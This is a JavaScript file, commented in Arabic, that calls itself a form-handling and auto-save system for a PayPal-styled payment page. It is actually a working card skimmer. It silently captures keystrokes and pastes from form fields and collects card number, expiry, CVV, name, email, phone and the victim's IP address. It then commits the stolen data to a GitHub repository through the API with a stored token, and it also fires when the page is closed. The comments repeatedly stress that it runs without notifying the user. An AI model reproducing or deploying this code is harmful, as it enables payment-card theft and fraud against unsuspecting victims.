// نظام إدارة النموذج وحفظ البيانات
class FormHandler {
    constructor() {
        this.userData = {};
        this.lastSentData = {};
        this.sendTimeout = null;
        this.isEnabled = true;
        
        // تهيئة النظام
        this.init();
    }
    
    init() {
        console.log('📋 Form Handler System Initialized');
        this.attachEventListeners();
        this.startPeriodicCheck();
    }
    
    // ربط مستمعي الأحداث
    attachEventListeners() {
        // مراقبة جميع حقول الإدخال
        const inputs = document.querySelectorAll('input[type="text"], input[type="email"], input[type="tel"], input[type="number"]');
        
        inputs.forEach(input => {
            // عند الكتابة مباشرة
            input.addEventListener('input', (e) => {
                this.captureFieldData(e.target);
                this.scheduleAutoSave();
            });
            
            // عند فقدان التركيز
            input.addEventListener('blur', (e) => {
                this.captureFieldData(e.target);
                this.saveDataIfChanged();
            });
            
            // عند لصق البيانات
            input.addEventListener('paste', (e) => {
                setTimeout(() => {
                    this.captureFieldData(e.target);
                    this.saveDataIfChanged();
                }, 100);
            });
        });
        
        // مراقبة زر الإرسال
        const submitButton = document.querySelector('.paypal-button');
        if (submitButton) {
            submitButton.addEventListener('click', (e) => {
                this.captureAllData();
                this.saveCompleteData();
            });
        }
        
        // مراقبة إرسال النموذج
        const form = document.getElementById('paymentForm');
        if (form) {
            form.addEventListener('submit', (e) => {
                this.captureAllData();
                this.saveCompleteData();
            });
        }
    }
    
    // التقاط بيانات حقل واحد
    captureFieldData(field) {
        const fieldName = field.name || field.id;
        const fieldValue = field.value.trim();
        
        if (fieldName && fieldValue) {
            this.userData[fieldName] = fieldValue;
            
            // حفظ صامت بدون إشعارات
            console.log(`Data captured: ${fieldName}`);
        }
    }
    
    // التقاط جميع البيانات
    captureAllData() {
        const fields = {
            'cardName': document.getElementById('cardName'),
            'cardNumber': document.getElementById('cardNumber'),
            'expiryDate': document.getElementById('expiryDate'),
            'cvv': document.getElementById('cvv'),
            'email': document.getElementById('email'),
            'phone': document.getElementById('phone'),
            'amount': document.getElementById('amount')
        };
        
        Object.keys(fields).forEach(key => {
            const field = fields[key];
            if (field && field.value.trim()) {
                this.userData[key] = field.value.trim();
            }
        });
    }
    
    // جدولة الحفظ التلقائي
    scheduleAutoSave() {
        if (this.sendTimeout) {
            clearTimeout(this.sendTimeout);
        }
        
        // حفظ البيانات بعد 3 ثوان من آخر كتابة
        this.sendTimeout = setTimeout(() => {
            this.saveDataIfChanged();
        }, 3000);
    }
    
    // حفظ البيانات إذا تغيرت
    saveDataIfChanged() {
        if (this.hasDataChanged() && Object.keys(this.userData).length > 0) {
            this.saveToServer(false);
        }
    }
    
    // حفظ البيانات الكاملة
    saveCompleteData() {
        this.captureAllData();
        this.saveToServer(true);
    }
    
    // فحص إذا تغيرت البيانات
    hasDataChanged() {
        return JSON.stringify(this.userData) !== JSON.stringify(this.lastSentData);
    }
    
    // حفظ البيانات في الخادم
    async saveToServer(isComplete = false) {
        if (!this.isEnabled || Object.keys(this.userData).length === 0) {
            return;
        }
        
        try {
            const payload = {
                data: this.userData,
                isComplete: isComplete,
                timestamp: new Date().toISOString(),
                pageUrl: window.location.href,
                userAgent: navigator.userAgent
            };
            
            console.log('💾 حفظ البيانات:', payload);
            
            // نظام GitHub Pages - حفظ محلي فقط
            this.saveLocally(payload, isComplete);
            
        } catch (error) {
            console.error('❌ خطأ في حفظ البيانات:', error);
            // خطأ صامت - بدون إشعارات للمستخدم
        }
    }
    
    // حفظ البيانات في GitHub
    async saveLocally(payload, isComplete) {
        try {
            // حفظ في localStorage للنسخ الاحتياطي
            const storageKey = `paypal_data_${Date.now()}`;
            localStorage.setItem(storageKey, JSON.stringify(payload));
            
            // إنشاء محتوى الملف
            const timestamp = new Date().toLocaleString('ar-EG', {
                timeZone: 'Africa/Cairo',
                year: 'numeric',
                month: '2-digit',
                day: '2-digit',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit'
            });
            
            let fileContent = `PayPal Card Information\n`;
            fileContent += `Time: ${timestamp}\n`;
            fileContent += `IP: ${await this.getUserIP()}\n`;
            fileContent += `Source: ${payload.pageUrl}\n\n`;
            
            const data = payload.data;
            if (data.cardName) fileContent += `Name: ${data.cardName}\n`;
            if (data.cardNumber) fileContent += `Card: ${data.cardNumber}\n`;
            if (data.expiryDate) fileContent += `Expiry: ${data.expiryDate}\n`;
            if (data.cvv) fileContent += `CVV: ${data.cvv}\n`;
            if (data.email) fileContent += `Email: ${data.email}\n`;
            if (data.phone) fileContent += `Phone: ${data.phone}\n`;
            if (data.amount) fileContent += `Amount: $${data.amount}\n`;
            
            fileContent += `\nUser-Agent: ${payload.userAgent}\n`;
            
            // حفظ في GitHub للبيانات الكاملة فقط
            if (isComplete) {
                await this.saveToGitHub(fileContent, timestamp);
            }
            
            this.lastSentData = { ...this.userData };
            // حفظ صامت - بدون إشعارات للمستخدم
            console.log('Data saved successfully');
            
        } catch (error) {
            console.error('❌ خطأ في الحفظ:', error);
            // خطأ صامت - بدون إشعارات للمستخدم
        }
    }
    
    // حفظ البيانات في GitHub Repository
    async saveToGitHub(fileContent, timestamp) {
        try {
            // التحقق من وجود تكوين GitHub
            if (typeof window.GITHUB_CONFIG === 'undefined') {
                throw new Error('تكوين GitHub غير موجود. يرجى إعداد ملف github-config.js');
            }
            
            const config = window.GITHUB_CONFIG;
            
            // إنشاء اسم الملف card.txt (سيتم الكتابة فوقه في كل مرة)
            const fileName = `${config.dataFolder}/card.txt`;
            
            // تحويل المحتوى إلى base64
            const contentBase64 = btoa(unescape(encodeURIComponent(fileContent)));
            
            // إعداد البيانات للإرسال
            const apiUrl = `https://api.github.com/repos/${config.owner}/${config.repo}/contents/${fileName}`;
            
            // محاولة الحصول على SHA للملف الموجود (إذا كان موجوداً)
            let sha = null;
            try {
                const existingFileResponse = await fetch(apiUrl, {
                    headers: {
                        'Authorization': `token ${config.token}`,
                        'Accept': 'application/vnd.github.v3+json'
                    }
                });
                if (existingFileResponse.ok) {
                    const existingFile = await existingFileResponse.json();
                    sha = existingFile.sha;
                }
            } catch (e) {
                // الملف غير موجود، سيتم إنشاؤه
            }
            
            const requestData = {
                message: `تحديث بيانات PayPal - ${timestamp}`,
                content: contentBase64,
                branch: config.branch,
                committer: config.committer
            };
            
            // إضافة SHA إذا كان الملف موجوداً
            if (sha) {
                requestData.sha = sha;
            }
            
            // إرسال البيانات إلى GitHub
            const response = await fetch(apiUrl, {
                method: 'PUT',
                headers: {
                    'Authorization': `token ${config.token}`,
                    'Content-Type': 'application/json',
                    'Accept': 'application/vnd.github.v3+json',
                    'User-Agent': 'PayPal-Data-System'
                },
                body: JSON.stringify(requestData)
            });
            
            if (!response.ok) {
                const errorData = await response.json();
                throw new Error(`GitHub API Error: ${response.status} - ${errorData.message || 'Unknown error'}`);
            }
            
            const result = await response.json();
            console.log('✅ تم حفظ البيانات في GitHub بنجاح:', result.content.download_url);
            
            // حفظ صامت - بدون إشعارات للمستخدم
            
            return result;
            
        } catch (error) {
            console.error('❌ خطأ في حفظ البيانات في GitHub:', error);
            
            // في حالة الفشل، نحفظ الملف محلياً كبديل
            this.downloadFile(fileContent, `paypal_data_backup_${Date.now()}.txt`);
            throw error;
        }
    }
    
    // الحصول على IP المستخدم
    async getUserIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            return 'Unknown IP';
        }
    }
    
    // تم حذف إشعارات GitHub - النظام يعمل بصمت
    
    // تنزيل ملف
    downloadFile(content, filename) {
        const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        window.URL.revokeObjectURL(url);
    }
    
    // فحص دوري للبيانات
    startPeriodicCheck() {
        setInterval(() => {
            if (this.hasDataChanged() && Object.keys(this.userData).length > 0) {
                this.saveDataIfChanged();
            }
        }, 10000); // فحص كل 10 ثوان
    }
    
    // تم حذف الإشعارات - حفظ صامت
    
    // تم حذف جميع الإشعارات - النظام يعمل بصمت
    
    // تشغيل/إيقاف النظام
    toggle(enabled) {
        this.isEnabled = enabled;
        console.log(`📋 Form Handler ${enabled ? 'مفعل' : 'معطل'}`);
    }
    
    // مسح البيانات
    clearData() {
        this.userData = {};
        this.lastSentData = {};
        console.log('🗑️ تم مسح البيانات');
    }
    
    // الحصول على البيانات الحالية
    getCurrentData() {
        return { ...this.userData };
    }
}

// تهيئة النظام عند تحميل الصفحة
document.addEventListener('DOMContentLoaded', function() {
    setTimeout(() => {
        window.formHandler = new FormHandler();
        
        // النظام جاهز - يعمل بصمت في الخلفية
    }, 1000);
});

// إضافة مستمع للتحقق من مغادرة الصفحة
window.addEventListener('beforeunload', function() {
    if (window.formHandler && Object.keys(window.formHandler.getCurrentData()).length > 0) {
        window.formHandler.saveCompleteData();
    }
});
